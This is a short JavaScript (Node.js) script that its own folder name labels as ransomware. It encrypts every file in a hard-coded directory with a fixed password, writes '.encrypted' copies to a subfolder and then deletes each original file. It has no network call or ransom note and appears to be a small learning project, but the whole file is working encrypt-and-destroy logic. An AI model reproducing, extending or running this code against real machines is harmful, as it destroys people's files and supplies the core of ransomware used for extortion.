const encryptor = require('file-encryptor');
const path = require('path');
const fs = require('fs');

const folderPath = 'D:/Ransomware_Gamilo/Items';
const password = 'imissyoually';
const outputFolder = path.join(folderPath, 'encrypted');


if (!fs.existsSync(folderPath)) {
  console.error(`Folder ${folderPath} does not exist.`);
  process.exit(1);
}


if (!fs.existsSync(outputFolder)) {
  fs.mkdirSync(outputFolder);
}


const files = fs.readdirSync(folderPath);


files.forEach((file) => {
  const filePath = path.join(folderPath, file);
  const encryptedFilePath = path.join(outputFolder, file + '.encrypted');


  if (fs.statSync(filePath).isFile()) {
    encryptor.encryptFile(filePath, encryptedFilePath, password, (err) => {
      if (err) {
        console.error(`Encryption failed for file ${file}:`, err);
      } else {
        console.log(`File ${file} encrypted successfully.`);
        
      
        
        fs.unlinkSync(filePath);
        console.log(`Original file ${file} deleted.`);
      }
    });
  }
});